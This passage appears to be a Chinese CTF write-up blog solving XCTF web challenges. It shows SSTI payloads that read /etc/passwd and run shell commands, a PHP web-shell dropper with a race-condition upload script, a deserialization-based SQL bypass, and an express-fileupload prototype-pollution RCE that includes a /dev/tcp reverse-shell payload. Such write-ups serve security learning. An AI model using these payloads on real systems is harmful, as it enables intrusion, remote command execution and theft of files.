<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[191].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/etc/passwd&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèëÁé∞ÂèØ‰ª•ËØªÂá∫,Áõ¥Êé•ËØªflagÂç≥ÂèØ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[191].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/flag&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖÁî®evalÂáΩÊï∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[191].__init__.__globals__.__builtins__[&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()&#34;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="wzsc_Êñá‰ª∂‰∏ä‰º†">wzsc_Êñá‰ª∂‰∏ä‰º†
</h2><p>‰∏ä‰º†phpÊñá‰ª∂‰ºöÊòæÁ§∫‰∏ä‰º†ÊàêÂäüÔºåËÄåÊü•ÁúãuploadÁõÆÂΩïÂç¥Ê≤°ÊúâÔºåÊÄÄÁñëÊòØ‰∏ä‰º†ÂêéÂ∞±Âà†Èô§ÔºåÁî®Êù°‰ª∂Á´û‰∫â‰∏ä‰º†</p>
<p>Êù°‰ª∂Á´û‰∫âÊú®È©¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[&#34;cmd&#34;]) ?&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÁî®bpÈáçÂ§çÂèëÂåÖ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150017122.png"
	width="1863"
	height="799"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150017122_hu5683731617195239960.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250131150017122_hu277031249413303383.png 1024w"
	loading="lazy"
	
		alt="image-20250131150017122"
	
	
		class="gallery-image" 
		data-flex-grow="233"
		data-flex-basis="559px"
	
></p>
<p>ÂÜçÁî®ËÑöÊú¨ÈáçÂ§çËÆøÈóÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">RaceCondition</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://61.147.171.105:54711/upload/1.php&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">uploadUrl</span> <span class="o">=</span> <span class="s1">&#39;http://61.147.171.105:54711/upload/shell.php&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_get</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;try to call uploaded file...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] create file shell.php success.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_upload</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;upload file...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">rs</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">uploadUrl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">rs</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] create file shell.php success.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">_get</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">_upload</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">_get</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">threads</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">threads</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">RaceCondition</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">threads</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150053681.png"
	width="509"
	height="92"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150053681_hu14919838603237096518.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250131150053681_hu8740031831123649511.png 1024w"
	loading="lazy"
	
		alt="image-20250131150053681"
	
	
		class="gallery-image" 
		data-flex-grow="553"
		data-flex-basis="1327px"
	
></p>
<p>ÁÑ∂ÂêéËÆøÈóÆshell.php,ËöÅÂâëËøûÊé•</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150118365.png"
	width="724"
	height="230"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150118365_hu3129424384619159249.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250131150118365_hu5445018704727670861.png 1024w"
	loading="lazy"
	
		alt="image-20250131150118365"
	
	
		class="gallery-image" 
		data-flex-grow="314"
		data-flex-basis="755px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150125648.png"
	width="1284"
	height="868"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150125648_hu12203235805707085652.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250131150125648_hu949963193443991761.png 1024w"
	loading="lazy"
	
		alt="image-20250131150125648"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="355px"
	
></p>
<h2 id="È¢òÁõÆÂêçÁß∞-warmup">È¢òÁõÆÂêçÁß∞-warmup
</h2><p>È¢òÁõÆÁªô‰∫ÜÈôÑ‰ª∂</p>
<p>ÊòØÁïåÈù¢Ê∫êÁ†Å</p>
<p>conn.phpÂÆö‰πâÁ±ªSQLÔºåÂú®ÂêéÈù¢Âä†‰∫ÜwafÔºåÊ≤°ÊúâËøáÊª§ÂçïÂºïÂè∑ÔºåË¶ÅÊ±ÇusernameÊòØadmin</p>
<p>index.php‰∏≠Êääcookie‰∏≠last_login_infoÁöÑÂÄºËøõË°åÂèçÂ∫èÂàóÂåñÂíåbase64ÔºåËÄå‰∏îÊääusernameÂíåpasswordËøõË°å‰∫ÜËΩ¨‰πâËøáÊª§ÔºåËÄåtableÊ≤°ÊúâËøáÊª§</p>
<p>Êàë‰ª¨ÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑtableÔºå‰ª§‰ªñÁöÑÂàóÈáåÈù¢username‰∏∫admin</p>
<p>poc:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SQL</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$table</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$conn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">=</span><span class="k">new</span> <span class="nx">SQL</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Ë¶ÅÂíåË°®ÂÜÖÁöÑÂ≠óÊÆµÂÄº‰∏ÄËá¥
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Êã¨Âè∑Â§ñÁöÑaÊòØÂ≠êÊü•ËØ¢Ë°®ÁöÑÂêçÂ≠ó
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">table</span><span class="o">=</span><span class="s2">&#34;(select &#39;admin&#39; username,&#39;1&#39; password)a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏äÈù¢ÁöÑÂ≠êÊü•ËØ¢Ë¢´ÂëΩÂêç‰∏∫ a„ÄÇËøôÊÑèÂë≥ÁùÄÊï¥‰∏™Â≠êÊü•ËØ¢ÁöÑÁªìÊûú‰ºöË¢´ËßÜ‰∏∫‰∏Ä‰∏™Âêç‰∏∫ a ÁöÑË°®„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="n">a</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201104327265.png"
	width="1040"
	height="781"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201104327265_hu6579471837153687749.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201104327265_hu11553994111174020342.png 1024w"
	loading="lazy"
	
		alt="image-20250201104327265"
	
	
		class="gallery-image" 
		data-flex-grow="133"
		data-flex-basis="319px"
	
></p>
<h2 id="badprogrammer">BadProgrammer
</h2><p>ÁõÆÂΩïÊâ´Êèè</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201131226076.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201131226076_hu2679026719480006199.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201131226076_hu14307410497659881226.png 1024w"
	loading="lazy"
	
		alt="image-20250201131226076"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p>static‰∏ãÂèØËÉΩÊúâ‰∏úË•ø</p>
<p>Ëøô‰∏™static../ÊòØÂà©Áî®‰∫ÜnginxÊ∫êÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥ûËÉΩÁúãÂà∞Ê∫êÁ†Å</p>
<p>Êü•Áúãapp.js</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fileUpload</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-fileupload&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">fileUpload</span><span class="p">({</span> <span class="nx">parseNested</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/4_pATh_y0u_CaNN07_Gu3ss&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;flag.ejs&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index.ejs&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;listening&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Express server started on port %s at %s&#39;</span><span class="p">,</span> <span class="nx">server</span><span class="p">.</span><span class="nx">address</span><span class="p">().</span><span class="nx">port</span><span class="p">,</span> <span class="nx">server</span><span class="p">.</span><span class="nx">address</span><span class="p">().</span><span class="nx">address</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>postËÆøÈóÆ//4_pATh_y0u_CaNN07_Gu3ss</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201131931953.png"
	width="1425"
	height="730"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201131931953_hu15366285220325289682.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201131931953_hu3338313991168673840.png 1024w"
	loading="lazy"
	
		alt="image-20250201131931953"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="468px"
	
></p>
<p>ËØ¥flagÂú®flag.txt‰∏≠</p>
<p>ËøôËæπÊúâexpress-fileupload,ÊêúÁ¥¢Âà∞Â≠òÂú®CVE-2020-7699ÊºèÊ¥û</p>
<p>Êü•Áúãpackage.jsonÔºåexpress-fileuploadÁâàÊú¨‰∏∫1.1.7,‰Ωé‰∫é1.1.9Â≠òÂú®ÊºèÊ¥û</p>
<p>ÊºèÊ¥ûÂéüÁêÜÔºöhttps://www.freebuf.com/vuls/246029.html</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201132504485.png"
	width="990"
	height="452"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201132504485_hu9551871758134051449.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201132504485_hu6740736284806348132.png 1024w"
	loading="lazy"
	
		alt="image-20250201132504485"
	
	
		class="gallery-image" 
		data-flex-grow="219"
		data-flex-basis="525px"
	
></p>
<p>ÂèçÂºπshellÈÄöÁî®payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">x;process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c &#34;bash -i &amp;&gt; /dev/tcp/ip/prot 0&gt;&amp;1&#34;&#39;);x
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áî®cpÊääflagÂ§çÂà∂Âà∞ÁõÆÂΩï/app/static/js/flag.txt‰∏ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">x;process.mainModule.require(&#39;child_process&#39;).exec(&#39;cp /flag.txt /app/static/js/flag.txt&#39;);x
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÊúâ‰∏§ÁßçÂäûÊ≥ï</p>
<p>‰∏ÄÁßçÊûÑÈÄ†ËØ∑Ê±ÇÂåÖÔºàÁõ¥Êé•ÊäÑÔºâ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /4_pATh_y0u_CaNN07_Gu3ss HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 61.147.171.105:49310
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">Content-Length: 289
</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=---------------------------1546646991721295948201928333
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-----------------------------1546646991721295948201928333
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;__proto__.outputFunctionName&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">x;process.mainModule.require(&#39;child_process&#39;).exec(&#39;cp /flag.txt /app/static/js/flag.txt&#39;);x
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-----------------------------1546646991721295948201928333--
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201133615187.png"
	width="1435"
	height="740"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201133615187_hu5009734052187153325.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201133615187_hu2962450190724324532.png 1024w"
	loading="lazy"
	
		alt="image-20250201133615187"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="465px"
	
></p>
<p>ÁÑ∂ÂêéËÆøÈóÆÁõÆÂΩïÂç≥ÂèØ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201133625062.png"
	width="1202"
	height="739"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201133625062_hu16867493497912874261.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201133625062_hu16973844753487149611.png 1024w"
	loading="lazy"
	
		alt="image-20250201133625062"
	
	
		class="gallery-image" 
		data-flex-grow="162"
		data-flex-basis="390px"
	
></p>
<p>Âè¶‰∏ÄÁßçÁî®ËÑöÊú¨ÂèëÂåÖ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">resp1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://</span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">/</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;61.147.171.105&#39;</span><span class="p">,</span> <span class="s1">&#39;49310&#39;</span><span class="p">,</span> <span class="s1">&#39;4_pATh_y0u_CaNN07_Gu3ss&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;__proto__.outputFunctionName&#39;</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">        <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;x;console.log(1);process.mainModule.require(&#39;child_process&#39;).exec(&#39;</span><span class="si">{cmd}</span><span class="s2">&#39;);x&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s1">&#39;cp /flag.txt /app/static/js/flag.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">)})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">resp1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="i-got-id-200">i-got-id-200
